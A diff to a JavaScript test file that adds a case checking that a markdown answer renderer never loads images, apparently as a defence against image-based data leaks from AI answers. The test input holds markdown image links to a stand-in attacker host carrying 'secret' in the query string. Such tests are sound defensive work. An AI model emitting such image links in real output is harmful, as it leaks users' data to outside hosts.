@@ -22,6 +22,13 @@ describe("AnswerMarkdown", () => {
     expect(html).not.toContain("[S1]");
   });
 
+  it("never loads an image, whatever URL the text names", () => {
+    const html = render("See [S1].\n\n![leak](https://attacker.example/p?d=secret)\n\n![ref][r]\n\n[r]: https://attacker.example/r");
+    expect(html).not.toContain("<img");
+    expect(html).not.toContain("attacker.example");
+    expect(html).toContain("[leak]");
+  });
+
   it("leaves markers inside inline code and code blocks alone", () => {
     const html = render("Use `[S1]` literally.\n\n```\nprint('[S2, S3]')\n```\n\nBut cite this [S2].");
     expect(html).toContain("<code");
